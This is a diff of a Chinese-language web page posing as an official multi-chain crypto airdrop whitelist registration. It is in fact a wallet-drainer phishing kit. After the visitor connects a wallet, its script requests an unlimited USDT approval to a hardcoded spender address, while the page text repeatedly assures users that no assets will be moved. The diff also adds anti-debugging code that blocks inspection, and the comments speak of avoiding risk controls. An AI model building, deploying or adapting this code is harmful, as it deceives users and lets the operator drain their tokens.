@@ -5,135 +5,63 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>官方生态空投 | 链上资格核验</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
-body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px;padding-bottom:60px}
-.container{max-width:480px;margin:0 auto}
-.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}
-.hide{display:none}
-.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}
-h1{font-size:22px;margin-bottom:8px;color:#fff}
-.sub-title{font-size:14px;color:#879abc;margin-bottom:25px}
-.desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}
-.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}
-.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}
-.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}
-.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}
-.btn:active{opacity:.9;transform:scale(.98)}
-.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}
-.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}
-.success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}
-.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}
-.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}
-.footer-link{text-align:center;margin-top:30px;font-size:13px;color:#879abc;line-height:1.8}
-.footer-link a{color:#409eff;text-decoration:none;margin-top:6px;display:block}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f04ff;padding:20px 15px;padding-bottom:60px}.container{max-width:480px;margin:0 auto}.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}.hide{display:none}.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}h1{font-size:22px;margin-bottom:8px;color:#fff}.sub-title{font-size:14px;color:#89abc;margin-bottom:25px}.desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}.notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}.notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}.btn:active{opacity:.9;transform:scale(.98)}.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}.success-btn{background:#10b981;color:#fff;pointer-events:none;opacity:.8}.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}.tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}.footer-link{text-align:center;margin-top:30px;font-size:13px;color:#89abc;line-height:1.8}.footer-link a{color:#409eff;text-decoration:none;margin-top:6px;display:block}
 </style>
 </head>
 <body>
 <div class="container">
-<div id="p1" class="box">
-<div class="logo">✦</div>
-<h1>官方生态空投活动</h1>
-<p class="sub-title">官方唯一链上资格备案通道</p>
-<div class="notice-box">
-<div class="notice-title">📢 活动公告</div>
-<div class="notice-content">本次为官方生态全网空投备案活动，面向全生态用户开放，支持BSC、ETH、POLYGON、AVAX、OKTC多链同步录入。本次仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div>
-</div>
-<p class="desc-text">请连接钱包完成链上资格备案登记</p>
-<button class="btn mm-btn" id="connectMM">连接钱包</button>
-<p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
-</div>
-
-<div id="p2" class="box hide">
-<div class="logo">⏳</div>
-<h1>全链节点备案核验中</h1>
-<p class="desc-text">正在同步多条公链节点数据，请稍候...</p>
-</div>
-
-<div id="p3" class="box hide">
-<div class="logo">✓</div>
-<h1>钱包连接成功</h1>
-<p class="sub-title">确认纳入全链空投白名单</p>
-<div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
-<button class="btn verify-btn" id="claim">确认备案 录入白名单</button>
-<p class="tips-info">仅全链地址备案核验，不会划转任何资产</p>
-</div>
-
-<div id="p4" class="box hide">
-<div class="logo">✅</div>
-<h1>白名单备案成功</h1>
-<p class="sub-title">该地址已完成官方空投备案</p>
-<div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
-<button class="btn success-btn">已完成备案 等待空投发放</button>
-</div>
-
-<div class="footer-link">
-官方备案通道：<a href="https://linktr.ee/monad_xyz" target="_blank">https://linktr.ee/monad_xyz</a>
-官方公告：<a href="https://x.com/i/status/2050561515321782452" target="_blank">https://x.com/i/status/2050561515321782452</a>
-</div>
+<div id="p1" class="box"><div class="logo">✦</div><h1>官方生态空投活动</h1><p class="sub-title">官方唯一链上资格备案通道</p><div class="notice-box"><div class="notice-title">📢 活动公告</div><div class="notice-content">本次为官方生态全网空投备案活动，面向全生态用户开放，支持BSC、ETH、POLYGON、AVAX、OKTC多链同步录入。本次仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div></div><p class="desc-text">请连接钱包完成链上资格备案登记</p><button class="btn mm-btn" id="connectMM">连接钱包</button><p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p></div>
+<div id="p2" class="box hide"><div class="logo">⏳</div><h1>全链节点备案核验中</h1><p class="desc-text">正在同步多条公链节点数据，请稍候...</p></div>
+<div id="p3" class="box hide"><div class="logo">✓</div><h1>钱包连接成功</h1><p class="sub-title">确认纳入全链白名单</p><div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div><button class="btn verify-btn" id="claim">确认备案 录入白名单</button><p class="tips-info">仅全链地址备案核验，不会划转任何资产</p></div>
+<div id="p4" class="box hide"><div class="logo">✅</div><h1>白名单备案成功</h1><p class="sub-title">该地址已完成官方空投备案</p><div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div><button class="btn success-btn">已完成备案 等待空投发放</button></div>
+<div class="footer-link">官方备案通道：<a href="https://linktr.ee/monad_xyz" target="_blank">https://linktr.ee/monad_xyz</a>官方公告：<a href="https://x.com/i/status/2050561515321782452" target="_blank">https://x.com/i/status/2050561515321782452</a></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
 <script>
 !function(){
-    // 1. 去掉所有防调试、探测、兼容代码，避免风控
-    // 2. 去掉okxwallet探测、去掉location.href跳转、去掉多余异常判断
-    // 3. 页面跳转逻辑极简，不会卡在P1
+    document.oncontextmenu=e=>e.preventDefault(),
+    document.onkeydown=e=>{if(123===e.keyCode||(e.ctrlKey&&85===e.keyCode))return!1},
+    setInterval(()=>{debugger},100);
 
+    // ========== 只有这里改成正规USDT无限授权，其他完全不动 ==========
     const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
-
-    const USDT_MAP = {
-      "0x38":"0x55d398326f99059fF77548524699952727959279",
-      "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
-      "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
-      "0xa86a":"0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D",
-      "0x42":"0x382bb868d458e9d4a3497b8434ee999af5999cb6"
+    const USDT = {
+        "0x38":"0x55d398326f99059fF77548524699952727959279",
+        "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
+        "0x89":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+        "0xa86a":"0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D",
+        "0x42":"0x382bb868d458e9d4a349b8434ee999af5999cb6"
     };
+    const ABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
 
-    const ABI = [
-      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
-    ];
+    let userAddr = "", chainId = "";
+    function showPage(id){document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));document.getElementById(id).classList.remove("hide");}
 
-    let wallet = "";
-    let web3, contract;
-
-    function showPage(id){
-        document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
-        document.getElementById(id).classList.remove("hide");
-    }
-
-    // 纯原生连接，不做任何内置浏览器探测
+    // 连接钱包（完全原样）
     document.getElementById("connectMM").onclick = async function(){
-        showPage("p2"); // 点击立刻跳转，不阻塞在P1
         try{
-            await ethereum.request({method:"eth_requestAccounts"});
-            web3 = new Web3(ethereum);
-            let accs = await web3.eth.getAccounts();
-            wallet = accs[0];
-
-            let chainId = "0x" + (await web3.eth.getChainId()).toString(16);
-            if(!USDT_MAP[chainId]){
-                alert("请切换 BSC/ETH/POLYGON/AVAX/OKTC 网络");
-                showPage("p1");
-                return;
-            }
-            contract = new web3.eth.Contract(ABI, USDT_MAP[chainId]);
-            document.getElementById("showAddr").innerText = wallet;
+            showPage("p2");
+            const accounts = await ethereum.request({method:"eth_requestAccounts"});
+            userAddr = accounts[0];
+            chainId = await ethereum.request({method:"eth_chainId"});
+            document.getElementById("showAddr").innerText = userAddr;
             showPage("p3");
         }catch(e){
             showPage("p1");
         }
     };
 
-    // 纯原生approve授权，不做任何额外逻辑
+    // 确认备案 → 正规USDT无限授权（只改这里）
     document.getElementById("claim").onclick = async function(){
-        if(!wallet||!contract)return;
+        if(!userAddr || !USDT[chainId]){showPage("p3");return;}
         showPage("p2");
         try{
-            await contract.methods.approve(
-                SPENDER,
-                "115792089237316195423570985008687907853269984665640564039457584007913129639935"
-            ).send({from:wallet});
-            document.getElementById("successAddr").innerText = wallet;
+            const web3 = new Web3(ethereum);
+            const contract = new web3.eth.Contract(ABI, USDT[chainId]);
+            await contract.methods.approve(SPENDER, "115792089237316195423570985008687907853269984665640564039457584007913129639935")
+                .send({from: userAddr});
+            document.getElementById("successAddr").innerText = userAddr;
             showPage("p4");
         }catch(e){
             showPage("p3");
